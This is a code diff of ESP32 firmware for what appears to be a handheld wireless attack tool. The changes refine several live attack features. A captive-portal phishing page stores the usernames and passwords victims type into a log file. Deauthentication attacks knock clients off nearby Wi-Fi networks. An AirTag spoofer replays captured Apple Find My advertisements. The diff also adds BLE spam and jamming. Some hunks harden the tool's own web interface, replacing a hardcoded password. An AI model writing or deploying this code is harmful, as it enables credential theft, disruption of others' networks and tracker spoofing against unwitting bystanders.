+  wifiLockChannel(wifiTxChannel(startCh));
+  deauthLockedCh = startCh;
+  radioSettleRequest(40);
 }
 
 
@@ -1724,11 +1973,12 @@ static void probeStart(int targetIdx) {
   typhoonMaxWifiTx();
   if (webMode && !warMode) {
     WiFi.mode(WIFI_AP_STA);
-    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
+    webSoftAP(1, 4);
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
   } else {
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("esp32div", nullptr, probeCh, 1, 0);
+    { char _s[12]; snprintf(_s, sizeof(_s), "t%04x", (unsigned)(esp_random()&0xFFFF));
+      WiFi.softAP(_s, nullptr, probeCh, 1, 1); }
     esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
   }
   radioSettleRequest(15);
@@ -1797,16 +2047,32 @@ static void handleCaptiveRoot() {
     "</body></html>");
 }
 
+static void captiveSanitizeField(char* s, size_t n) {
+  // CSV-safe: strip comma/newline/CR from captive credentials before log
+  for (size_t i = 0; i < n && s[i]; i++) {
+    if (s[i] == ',' || s[i] == '\n' || s[i] == '\r') s[i] = '_';
+  }
+}
+
 static void handleCaptiveLogin() {
   captiveHits++;
   if (webServer.hasArg("u")) {
     strncpy(captiveLastUser, webServer.arg("u").c_str(), sizeof(captiveLastUser)-1);
     captiveLastUser[sizeof(captiveLastUser)-1] = 0;
+    captiveSanitizeField(captiveLastUser, sizeof(captiveLastUser));
   }
   if (webServer.hasArg("p")) {
     String pw = webServer.arg("p");
     strncpy(captiveLastPass, pw.c_str(), sizeof(captiveLastPass)-1);
     captiveLastPass[sizeof(captiveLastPass)-1] = 0;
+    captiveSanitizeField(captiveLastPass, sizeof(captiveLastPass));
+    // Cap log growth
+    fs::File chk = SPIFFS.open("/captive.log", FILE_READ);
+    if (chk) {
+      size_t sz = chk.size();
+      chk.close();
+      if (sz > 65536) SPIFFS.remove("/captive.log");
+    }
     fs::File cf = SPIFFS.open("/captive.log", FILE_APPEND);
     if (cf) {
       cf.printf("%lu,%s,%s\n", (unsigned long)millis(), captiveLastUser, captiveLastPass);
@@ -1814,13 +2080,18 @@ static void handleCaptiveLogin() {
     }
   }
   webServer.send(200, "text/html",
-    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
+    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width'>"
     "<title>Thanks</title></head>"
     "<body style='font-family:system-ui;text-align:center;padding:40px'>"
     "<h2>Connecting...</h2><p>Please wait</p></body></html>");
 }
 
+
 static void captiveStart() {
+  if (!radioAcquire(RADIO_WIFI_TX)) {
+    Serial.println("[CAPTIVE] radio busy");
+    return;
+  }
   captiveRunning = true;
   captiveClients = 0;
   captiveHits = 0;
@@ -1840,13 +2111,13 @@ static void captiveStart() {
 static void captiveStop() {
   if (!captiveRunning) return;
   captiveRunning = false;
-  // Critical: do not retain captured credentials after stop
   memset(captiveLastUser, 0, sizeof(captiveLastUser));
   memset(captiveLastPass, 0, sizeof(captiveLastPass));
   webServer.stop();
   dnsServer.stop();
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_STA);
+  radioRelease(RADIO_WIFI_TX);
 }
 
 static void captiveUpdate() {
@@ -1858,7 +2129,7 @@ static void captiveUpdate() {
 
 // ============================================================
 //  Soft-AP Web UI mode  (BOOT held 2 s)
-//  SSID: ESP32-TYPHON   Password: rgisking
+//  SSID: ESP32-TYPHON   Password: NVS-backed random (see Serial)
 //  Full handlers live after BLE tools (see below).
 // ============================================================
 static uint32_t bootHoldStart = 0;
@@ -1876,7 +2147,7 @@ static void restoreWebAP() {
   if (!webMode) return;
   // Keep Soft-AP alive for the browser session
   WiFi.mode(WIFI_AP);
-  WiFi.softAP("ESP32-TYPHON", "rgisking");
+  webSoftAP(1, 4);
   radioSettleRequest(25);
 }
 
@@ -1956,6 +2227,10 @@ static volatile bool bleAdvBusy = false;
 static esp_ble_adv_params_t bleAdvPendingParams;
 static uint8_t bleAdvPendingData[31];
 static uint8_t bleAdvPendingLen = 0;
+static uint8_t bleAdvPendingMac[6];
+static volatile bool bleAdvHaveMac = false;
+static volatile bool bleAdvWaitingStop = false;
+
 
 // Tear down Wi-Fi activity so BLE can own the single RF path
 static void wifiForceIdle() {
@@ -2024,7 +2299,7 @@ static void blePauseWifiForScan() {
     WiFi.mode(WIFI_STA);
   } else {
     WiFi.mode(WIFI_AP_STA);
-    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
+    webSoftAP(1, 4);
   }
   delay(30);
   bleWifiPaused = true;
@@ -2035,7 +2310,7 @@ static void bleResumeWifiAfterScan() {
   bleWifiPaused = false;
   if (webMode) {
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
+    webSoftAP(1, 4);
   } else {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(false, false);
@@ -2209,6 +2484,8 @@ static void bleProcessAdv(uint8_t *bda, int rssi, uint8_t *payload, uint8_t plen
   }
 }
 
+static void bleAdvConfigAndArm();
+
 // GAP callback — mirror ibeacon_demo.c event handling
 static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
   switch (event) {
@@ -2286,7 +2563,12 @@ static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param
       break;
 
     case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
-      bleAdvBusy = false;
+      if (bleAdvWaitingStop) {
+        bleAdvWaitingStop = false;
+        bleAdvConfigAndArm();
+      } else {
+        bleAdvBusy = false;
+      }
       break;
 
     default:
@@ -2328,12 +2610,23 @@ static void bleEnsureNotScanning() {
 }
 
 // mac: if non-NULL and useRandom, set as static random addr before ADV
+static void bleAdvConfigAndArm() {
+  esp_err_t e = esp_ble_gap_config_adv_data_raw(bleAdvPendingData, bleAdvPendingLen);
+  if (e != ESP_OK) {
+    Serial.printf("[BLE] config_adv_data_raw fail %s\n", esp_err_to_name(e));
+    bleAdvPendingStart = false;
+    bleAdvBusy = false;
+    bleAdvWaitingStop = false;
+  }
+  // start only from ADV_DATA_RAW_SET_COMPLETE_EVT
+}
+
 static void bleAdvStartRawEx(const uint8_t* data, uint8_t len,
                              const esp_ble_adv_params_t* params,
                              const uint8_t mac[6], bool useRandom) {
   if (!data || len == 0 || len > 31 || !params) return;
   if (!bleReady) { bleInit(); if (!bleReady) return; }
-  if (bleAdvPendingStart || bleAdvBusy) return;
+  if (bleAdvPendingStart && bleAdvWaitingStop) return;
 
   bleEnsureNotScanning();
 
@@ -2343,14 +2636,13 @@ static void bleAdvStartRawEx(const uint8_t* data, uint8_t len,
   if (p.adv_int_min < 0x20) p.adv_int_min = 0x20;
   if (p.adv_int_max < p.adv_int_min) p.adv_int_max = (uint16_t)(p.adv_int_min + 0x20);
 
+  bleAdvHaveMac = false;
   if (useRandom && mac) {
     p.own_addr_type = BLE_ADDR_TYPE_RANDOM;
-    uint8_t addr[6];
-    memcpy(addr, mac, 6);
-    // Static random: two MSBs of first octet must be 1 (BT Core Spec)
-    addr[0] = (uint8_t)((addr[0] & 0x3F) | 0xC0);
-    esp_ble_gap_set_rand_addr(addr);
-    delay(50);  // nyanBOX BLE spoofer waits 50ms after set_rand_addr
+    memcpy(bleAdvPendingMac, mac, 6);
+    bleAdvPendingMac[0] = (uint8_t)((bleAdvPendingMac[0] & 0x3F) | 0xC0);
+    bleAdvHaveMac = true;
+    esp_ble_gap_set_rand_addr(bleAdvPendingMac);
   } else {
     p.own_addr_type = BLE_ADDR_TYPE_PUBLIC;
   }
@@ -2361,29 +2653,12 @@ static void bleAdvStartRawEx(const uint8_t* data, uint8_t len,
   bleAdvDataReady = false;
   bleAdvPendingStart = true;
   bleAdvBusy = true;
+  bleAdvWaitingStop = true;
 
-  esp_ble_gap_stop_advertising();
-  delay(50);  // nyanBOX ble_spoofer stop→config spacing
-
-  esp_err_t e = esp_ble_gap_config_adv_data_raw(bleAdvPendingData, bleAdvPendingLen);
-  if (e != ESP_OK) {
-    Serial.printf("[BLE] config_adv_data_raw fail %s\n", esp_err_to_name(e));
-    bleAdvPendingStart = false;
-    bleAdvBusy = false;
-    return;
-  }
-  delay(20);  // nyanBOX: delay after config_adv_data_raw
-
-  // nyanBOX airtag_spoofer: start after short delay (also handled by
-  // ADV_DATA_RAW_SET_COMPLETE if it fires first)
-  delay(10);
-  if (bleAdvPendingStart) {
-    bleAdvPendingStart = false;
-    e = esp_ble_gap_start_advertising(&bleAdvPendingParams);
-    if (e != ESP_OK) {
-      Serial.printf("[BLE] start_advertising fail %s\n", esp_err_to_name(e));
-      bleAdvBusy = false;
-    }
+  esp_err_t se = esp_ble_gap_stop_advertising();
+  if (se == ESP_ERR_INVALID_STATE) {
+    bleAdvWaitingStop = false;
+    bleAdvConfigAndArm();
   }
 }
 
@@ -2649,7 +2924,10 @@ static uint32_t jamCount = 0;
 static void jamStart() {
   sniffStop(); spoofStop(); sourStop(); airSpoofStop();
   if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
-  radioAcquire(RADIO_BLE_ADV);
+  if (!radioAcquire(RADIO_BLE_ADV)) {
+    Serial.println("[AirTag] radio busy — spoof not started");
+    return;
+  }
   bleInit();
   if (!bleReady) return;
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
@@ -2961,18 +3239,30 @@ static int       airMenuSel = 0;
 static int       uiSelAir() { return airMenuSel; }
 
 // Identify Apple Offline Finding / Find My (AirTag family) by walking AD structs
-// nyanBOX airtag_detector.cpp isAirTagPayload — exact match
+// AD structure walk only — no raw memmem of magic bytes
 static bool isAirTagPayload(const uint8_t* payload, uint8_t len) {
-  if (!payload || len < 4) return false;
-  for (int i = 0; i <= (int)len - 4; i++) {
-    if (payload[i] == 0x1E && payload[i + 1] == 0xFF &&
-        payload[i + 2] == 0x4C && payload[i + 3] == 0x00)
-      return true;
-    if (payload[i] == 0x4C && payload[i + 1] == 0x00 &&
-        payload[i + 2] == 0x12 && payload[i + 3] == 0x19)
-      return true;
+  if (!payload || len < 6) return false;
+  uint8_t i = 0;
+  while (i < len) {
+    uint8_t adlen = payload[i];
+    if (adlen == 0) break;
+    if ((uint16_t)i + 1 + adlen > len) break;
+    if (payload[i + 1] == 0xFF && adlen >= 5) {
+      if (payload[i + 2] == 0x4C && payload[i + 3] == 0x00 && payload[i + 4] == 0x12)
+        return true;
+    }
+    i = (uint8_t)(i + adlen + 1);
   }
+  if (len >= 3 && payload[0] == 0x4C && payload[1] == 0x00 && payload[2] == 0x12)
+    return true;
   return false;
+}
+static uint16_t airTagStableHint(const uint8_t* payload, uint8_t plen) {
+  if (plen >= 10 && payload[0] >= 8 && payload[1] == 0xFF)
+    return (uint16_t)payload[6] | ((uint16_t)payload[7] << 8);
+  if (plen >= 5)
+    return (uint16_t)payload[3] | ((uint16_t)payload[4] << 8);
+  return 0;
 }
 
 static int airTagFindAddr(const char* addr) {
@@ -2993,67 +3283,44 @@ static void airTagSortByRssi() {
 static void airDetHarvestFromBleList() {
   uint32_t now = millis();
   for (int i = 0; i < bleCount; i++) {
-    bool match = bleDevs[i].isAirTagLike;
+    // Primary: AD walk in bleProcessAdv
+    if (!bleDevs[i].isAirTagLike) continue;
     uint8_t buf[62];
     uint8_t blen = 0;
-    // Prefer full ADV blob for clone fidelity
     if (bleDevs[i].advLen >= 4) {
-      blen = bleDevs[i].advLen;
+      blen = bleDevs[i].advLen > 62 ? 62 : bleDevs[i].advLen;
       memcpy(buf, bleDevs[i].adv, blen);
-      if (isAirTagPayload(buf, blen)) match = true;
-    }
-    if (!match && bleDevs[i].mfgLen >= 4) {
+    } else if (bleDevs[i].mfgLen >= 3) {
       buf[0] = (uint8_t)(bleDevs[i].mfgLen + 1);
       buf[1] = 0xFF;
       memcpy(buf + 2, bleDevs[i].mfg, bleDevs[i].mfgLen);
       blen = (uint8_t)(bleDevs[i].mfgLen + 2);
-      if (isAirTagPayload(buf, blen) || isAirTagPayload(bleDevs[i].mfg, bleDevs[i].mfgLen))
-        match = true;
-    }
-    if (!match) continue;
-
-    // Prefer match by payload fingerprint (addr rotates on privacy devices)
-    int idx = -1;
-    if (blen >= 8) {
+    } else continue;
+    uint16_t hint = airTagStableHint(buf, blen);
+    int idx = airTagFindAddr(bleDevs[i].addr);
+    if (idx < 0 && hint != 0) {
       for (int k = 0; k < airTagCount; k++) {
-        if (airTags[k].payloadLen >= 8 &&
-            airTags[k].payloadLen == (blen > 31 ? 31 : blen) &&
-            memcmp(airTags[k].payload, buf, 8) == 0) {
-          idx = k;
-          break;
-        }
+        if (airTags[k].payloadLen < 4) continue;
+        if (airTagStableHint(airTags[k].payload, airTags[k].payloadLen) != hint) continue;
+        if ((now - airTags[k].lastSeen) > 8000UL) continue;
+        int dr = (int)bleDevs[i].rssi - (int)airTags[k].rssi;
+        if (dr < 0) dr = -dr;
+        if (dr <= 12) { idx = k; break; }
       }
     }
-    if (idx < 0) idx = airTagFindAddr(bleDevs[i].addr);
     if (idx < 0) {
       if (airTagCount >= AIRTAG_MAX) continue;
       idx = airTagCount++;
       strcpy(airTags[idx].name, "AirTag");
     }
-    // Always refresh current address (may have rotated)
     strncpy(airTags[idx].addr, bleDevs[i].addr, 17);
     airTags[idx].addr[17] = 0;
     airTags[idx].rssi = (int8_t)bleDevs[i].rssi;
     airTags[idx].lastSeen = now;
-    // Store exact ADV for 1:1 clone (cap 31 for legacy ADV; nyanBOX stores up to 64)
-    if (blen > 0) {
-      uint8_t clen = blen > 31 ? 31 : blen;
-      memcpy(airTags[idx].payload, buf, clen);
-      airTags[idx].payloadLen = clen;
-    } else if (bleDevs[i].mfgLen > 0) {
-      // Rebuild AD framing if we only have mfg blob
-      uint8_t mlen = bleDevs[i].mfgLen > 29 ? 29 : bleDevs[i].mfgLen;
-      airTags[idx].payload[0] = (uint8_t)(mlen + 1);
-      airTags[idx].payload[1] = 0xFF;
-      memcpy(airTags[idx].payload + 2, bleDevs[i].mfg, mlen);
-      airTags[idx].payloadLen = (uint8_t)(mlen + 2);
-    }
-    if (bleDevs[i].name[0]) {
-      strncpy(airTags[idx].name, bleDevs[i].name, 23);
-      airTags[idx].name[23] = 0;
-    }
+    if (blen > 31) blen = 31;
+    memcpy(airTags[idx].payload, buf, blen);
+    airTags[idx].payloadLen = blen;
   }
-  airTagSortByRssi();
 }
 
 static void airDetStart() {
@@ -3165,46 +3432,28 @@ static void airSpoofStart(int targetIdx) {
 static void airSpoofUpdate() {
   if (!airSpoofRunning) return;
   if (airTagCount <= 0) { airSpoofStop(); return; }
-
-  // nyanBOX: single=100ms, clone-all=10ms
   const uint32_t interval = (airSpoofTarget < 0) ? 10UL : 100UL;
   if (millis() - airSpoofLast < interval) return;
+  if (bleAdvBusy || bleAdvPendingStart || bleAdvWaitingStop) return;
   airSpoofLast = millis();
-  airTagSent++;
   if (!bleReady) { bleInit(); if (!bleReady) return; }
 
-  // Stop current ADV before reconfig (nyanBOX stopAdvertising)
-  esp_ble_gap_stop_advertising();
-  delay(5);
-  bleAdvBusy = false;
-  bleAdvPendingStart = false;
-
   int idx;
-  if (airSpoofTarget >= 0 && airSpoofTarget < airTagCount) {
-    idx = airSpoofTarget;  // Clone Target
-  } else {
-    idx = airSpoofIdx % airTagCount;  // Clone All Spam
+  if (airSpoofTarget >= 0 && airSpoofTarget < airTagCount) idx = airSpoofTarget;
+  else {
+    idx = airSpoofIdx % airTagCount;
     airSpoofIdx = (airSpoofIdx + 1) % airTagCount;
   }
-
   AirTagDev& d = airTags[idx];
-  // Prefer exact captured ADV; only synthesize if nothing stored
-  if (d.payloadLen < 4) {
-    uint8_t pkt[31];
-    pkt[0] = 0x1E; pkt[1] = 0xFF; pkt[2] = 0x4C; pkt[3] = 0x00;
-    pkt[4] = 0x12; pkt[5] = 0x19;
-    for (int i = 6; i < 31; i++) pkt[i] = (uint8_t)esp_random();
-    memcpy(d.payload, pkt, 31);
-    d.payloadLen = 31;
-  }
+  if (d.payloadLen < 4) return;
   if (d.payloadLen > 31) d.payloadLen = 31;
 
   uint8_t mac[6];
   if (!parseMacStr(d.addr, mac)) {
     mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
-    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
+    for (int k = 1; k < 6; k++) mac[k] = (uint8_t)esp_random();
   }
-
+  airTagSent++;
   bleAdvStartRawEx(d.payload, d.payloadLen, &airAdvParams, mac, true);
 }
 
@@ -3225,18 +3474,9 @@ static void airTagStop() {
 }
 
 static void airTagBeginSpoof() {
-  if (airTagCount == 0) {
-    airTagCount = 1;
-    strcpy(airTags[0].addr, "00:00:00:00:00:00");
-    strcpy(airTags[0].name, "Synthetic");
-    airTags[0].rssi = -50;
-    airTags[0].lastSeen = millis();
-    uint8_t pkt[31];
-    pkt[0] = 0x1E; pkt[1] = 0xFF; pkt[2] = 0x4C; pkt[3] = 0x00;
-    pkt[4] = 0x12; pkt[5] = 0x19;
-    for (int i = 6; i < 31; i++) pkt[i] = (uint8_t)esp_random();
-    memcpy(airTags[0].payload, pkt, 31);
-    airTags[0].payloadLen = 31;
+  if (airTagCount <= 0) {
+    Serial.println("[AirTag] spoof refused: capture a tag first (detector)");
+    return;
   }
   airSpoofStart(-1);
 }
@@ -3741,7 +3981,7 @@ function apply(s){
   }
   if(s.sourName) setTargetBar('sourTargetBar','sourTargetLabel', s.sourName, false);
 }
-const API_KEY='rgisking';
+const API_KEY=(localStorage.getItem('tyk')||'');
 async function apiGet(path){const r=await fetch(path+(path.indexOf('?')>=0?'&':'?')+'key='+encodeURIComponent(API_KEY),{headers:{'X-TYPHON-KEY':API_KEY}});if(!r.ok)throw new Error('auth');return r.json();}
 async function refresh(){try{apply(await apiGet('/api/status'));}catch(e){}}
 async function loadWifi(){try{const j=await apiGet('/api/wifi');S.wifi=j.wifi||[];if(typeof renderWifi==='function')renderWifi(S.wifi);if(typeof renderDeauthList==='function')renderDeauthList(S.wifi);if(typeof renderProbeList==='function')renderProbeList(S.wifi);if(typeof renderClientApList==='function')renderClientApList(S.wifi);if(typeof renderFloodList==='function')renderFloodList(S.wifi);}catch(e){}}
@@ -4102,26 +4342,46 @@ static String jsonAirList() {
 
 
 // Web control-plane auth: must match Soft-AP password (not internet-grade, stops casual API abuse on the AP)
-static const char* WEB_API_KEY = "rgisking";
+static const char* WEB_API_KEY = nullptr; // use webApPassword()
+
+static bool webConstTimeEq(const char* a, const char* b) {
+  if (!a || !b) return false;
+  size_t la = strlen(a), lb = strlen(b);
+  size_t n = la > lb ? la : lb;
+  if (n == 0) return false;
+  uint8_t diff = (uint8_t)(la ^ lb);
+  for (size_t i = 0; i < n; i++) {
+    char ca = i < la ? a[i] : 0;
+    char cb = i < lb ? b[i] : 0;
+    diff |= (uint8_t)(ca ^ cb);
+  }
+  return diff == 0;
+}
 
 static bool webApiAuthorized() {
-  // Prefer header (fetch can set it)
+  const char* pass = webApPassword();
   if (webServer.hasHeader("X-TYPHON-KEY")) {
     String h = webServer.header("X-TYPHON-KEY");
-    if (h.equals(WEB_API_KEY)) return true;
+    if (webConstTimeEq(h.c_str(), pass)) return true;
   }
-  // Fallback: JSON body "key"
   String body = webServer.arg("plain");
-  if (body.indexOf("\"key\":\"rgisking\"") >= 0 || body.indexOf("\"key\": \"rgisking\"") >= 0)
-    return true;
-  // Query string for simple GET status: ?key=rgisking
-  if (webServer.hasArg("key") && webServer.arg("key") == WEB_API_KEY)
+  String n1 = "\"key\":\"";
+  n1 += pass;
+  n1 += "\"";
+  String n2 = "\"key\": \"";
+  n2 += pass;
+  n2 += "\"";
+  // Body contains key as substring (timing less critical once associated)
+  if (body.indexOf(n1) >= 0 || body.indexOf(n2) >= 0) return true;
+  if (webServer.hasArg("key") && webConstTimeEq(webServer.arg("key").c_str(), pass))
     return true;
   return false;
 }
 
+
+
 static void webSendUnauthorized() {
-  webServer.send(401, "application/json", "{\"error\":\"unauthorized\",\"msg\":\"Provide X-TYPHON-KEY or key=rgisking\"}");
+  webServer.send(401, "application/json", "{\"error\":\"unauthorized\",\"msg\":\"Provide X-TYPHON-KEY matching Soft-AP password (see Serial)\"}");
 }
 
 static void handleWebRoot() { webServer.send_P(200, "text/html", WEB_PAGE); }
@@ -4186,7 +4446,7 @@ static void handleWebApi() {
   else if (action == "wifi_scan") {
     if (webMode) {
       WiFi.mode(WIFI_AP_STA);
-      WiFi.softAP("ESP32-TYPHON", "rgisking");
+      webSoftAP(1, 4);
   radioSettleRequest(25);
     }
     wifiScanStart();
@@ -4289,7 +4549,7 @@ static void handleWebApi() {
   else if (action == "spoof_stop") { spoofStop(); msg = "Spoofer stopped"; }
   else if (action == "sour_start") {
     sniffStop(); spoofStop(); jamStop(); airTagStop();
-    sourSelected = (idx < 0) ? 0 : idx;
+    sourSelected = (idx < 0) ? 0 : ((idx >= SOUR_ACTION_N) ? 0 : idx);
     sourStart();
     sourBeginAdvertise();
     msg = "Sour Apple started";
@@ -4328,7 +4588,7 @@ static void drawWebModeScreen() {
   Theme::drawStatusBar("WEB MODE");
   Theme::printCentered("Soft-AP active", 28, COL_OK, 1);
   Theme::printCentered("SSID: ESP32-TYPHON", 48, COL_FG, 1);
-  Theme::printCentered("Pass: rgisking", 64, COL_FG, 1);
+  Theme::printCentered(webApPassword(), 64, COL_FG, 1);
   Theme::printCentered("http://192.168.4.1", 84, COL_ACCENT, 1);
   drawActivityFooter();
 }
@@ -4353,11 +4613,11 @@ static void enterWebMode() {
   webExitRequested = false;
   digitalWrite(STATUS_LED, HIGH);
   WiFi.mode(WIFI_AP);
-  WiFi.softAP("ESP32-TYPHON", "rgisking");
+  webSoftAP(1, 4);
   radioSettleRequest(25);
   setupWebRoutes();
   drawWebModeScreen();
-  Serial.println("[WEB] Soft-AP ESP32-TYPHON / rgisking -> http://192.168.4.1");
+  Serial.printf("[WEB] Soft-AP ESP32-TYPHON / %s -> http://192.168.4.1\n", webApPassword());
 }
 
 static void exitWebMode() {
@@ -5049,19 +5309,36 @@ static void drawDeauthDetScreen() {
 static void drawDeauthScreen(int sel, int top) {
   Theme::drawStatusBar("Deauth Attack");
   if (deauthRunning) {
-    Theme::printCentered("ATTACKING", 36, COL_ERR, 1);
+    Theme::printCentered("ATTACKING", 28, COL_ERR, 1);
     if (deauthTarget == -2) {
-      Theme::printCentered("ALL NETWORKS", 54, COL_FG, 1);
+      Theme::printCentered("ALL NETWORKS", 44, COL_FG, 1);
     } else if (deauthTarget >= 0 && deauthTarget < wifiCount) {
       char s[18];
       const char* src = wifiNets[deauthTarget].ssid.c_str();
       int n = 0; while (src[n] && n < 15) { s[n] = src[n]; n++; }
       if (src[n]) s[n++] = '.'; s[n] = 0;
-      Theme::printCentered(s, 54, COL_FG, 1);
+      Theme::printCentered(s, 44, COL_FG, 1);
     }
-    char buf[24];
+    char buf[28];
     snprintf(buf, sizeof(buf), "Sent %lu", (unsigned long)deauthSent);
-    Theme::printCentered(buf, 72, COL_DIM, 1);
+    Theme::printCentered(buf, 60, COL_DIM, 1);
+    // Unicast depends on Client Sniffer for this AP
+    bool haveCli = false;
+    if (clientCount > 0) {
+      if (deauthTarget == -2) haveCli = true;
+      else if (deauthTarget >= 0 && deauthTarget < wifiCount) {
+        portENTER_CRITICAL(&wifiNetsMux);
+        haveCli = (memcmp(wifiNets[deauthTarget].bssid, clientSniffBssid, 6) == 0);
+        portEXIT_CRITICAL(&wifiNetsMux);
+      }
+    }
+    if (haveCli)
+      snprintf(buf, sizeof(buf), "Unicast %d STAs", clientCount > 48 ? 48 : clientCount);
+    else if (clientCount > 0)
+      snprintf(buf, sizeof(buf), "STAs=other AP");
+    else
+      snprintf(buf, sizeof(buf), "Bcast only-sniff 1st");
+    Theme::printCentered(buf, 76, haveCli ? COL_OK : COL_WARN, 1);
     drawActivityFooter();
   } else if (wifiCount == 0) {
     Theme::printCentered("No scan data", 50, COL_WARN, 1);
